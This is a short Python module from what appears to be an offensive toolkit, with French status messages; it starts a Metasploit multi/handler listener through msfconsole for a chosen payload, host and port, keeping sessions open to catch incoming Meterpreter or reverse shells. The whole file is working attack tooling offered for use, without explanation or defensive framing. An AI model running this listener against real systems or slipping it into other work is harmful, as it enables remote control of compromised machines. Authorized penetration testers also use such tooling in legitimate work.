# modules/listener_meterpreter.py
import subprocess
import os

def start_listener(lhost, lport, payload):
    print(f"[•] Démarrage du service d'écoute sur {lhost}:{lport} avec le payload : {payload}\n")

    script = f"""
    use exploit/multi/handler;
    set PAYLOAD {payload};
    set LHOST {lhost};
    set LPORT {lport};
    set ExitOnSession false;
    exploit -j
    """

    try:
        subprocess.call(["msfconsole", "-q", "-x", script])
    except KeyboardInterrupt:
        print("\n[!] Service d'écoute arrêté par l'utilisateur.")
